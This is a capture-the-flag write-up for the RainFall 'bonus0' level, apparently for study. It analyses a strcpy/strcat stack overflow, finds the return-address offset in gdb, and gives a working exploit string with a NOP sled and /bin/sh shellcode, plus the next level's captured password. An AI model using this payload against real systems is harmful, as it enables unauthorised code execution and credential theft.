# **Bonus0**

## **Analysis**

**In `main()`:**

```c
    char	str[0x40 - 0x16]; // 0x2a = 42

	pp( str );
	puts( str );
	return (0);
```

**In `pp()`**

```c
    // Allocate 2 string of 20 characters
    char    str1[20];
    char    str2[20];
    // Put the first 20 characters of stdin on them
    // Won't end by a '\0' if stdin's len greater than 20 characters
    p( str1, separator );
    p( str2, separator );

    // Copy content of str1 into dest
    // Plus str2 if str1 hasn't '\0'
    strcpy( dest, str1 );

    // end dest with " \0"
    len = strlen( dest );
    dest[len] = " ";
    dest[len + 1] = 0;
    
    // Concat dest with str2
    strcat( dest, str2 );
```

```c
    char    buffer[0x1000]; // 4096

    puts( prompt );

    // Read stdin into buffer
    read( 0, buffer, 0x1000 ); // 4096
    
    // replace first occurence of '\n' by '\0'
    ret = strchr( buffer, '\n' );
    *ret = 0;
    
    // copy the first 20 characters into dest
    strncpy( dest, buffer, 0x14 ); // 20
```
___

## **Exploit**

Lets determine the offset
```
 ❯ python3 offset.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
0123456789abcdefghij
 -
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
0123456789abcdefghijAAAABBBBCCCCDDDDEEEE�� AAAABBBBCCCCDDDDEEEE��

Program received signal SIGSEGV, Segmentation fault.
0x44434343 in ?? ()

 ❯ python3 offset.py 43
8
 ❯ python3 offset.py 44
12
```

OFFSET: 9

We will put the shellcode in the 4096 character buffer,
Let get its adress
```
(gdb) b *p+81
Breakpoint 1 at 0x8048505
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
4242

Breakpoint 1, 0x08048505 in p ()
(gdb) x/4c $eax
0xbfffe650:     52 '4'  50 '2'  52 '4'  50 '2'
(gdb) c
Continuing.
 -
ABCD

Breakpoint 1, 0x08048505 in p ()
(gdb) x/4c $eax
0xbfffe650:     65 'A'  66 'B'  67 'C'  68 'D'
```

0xbfffe650 + 96(0x60) = 0xbfffe6b0

96 = 9 + 4 + 83

Solution:
 * (4096) skip first string
 * (09) offset
 * (04) adress of shellcode in buffer [0xbfffe6b0]
 * (83) offset until shellcode, 96 - 9 - 4 = 83
 * (45) shellcode

```
bonus0@RainFall:~$ python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "\xb0\xe6\xff\xbf" + "\x90" * 83 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"' > /tmp/bonus0 && cat /tmp/bonus0 - | ./bonus0
 -
 -
������������������������������������������� �����������������������
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

___

*Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728*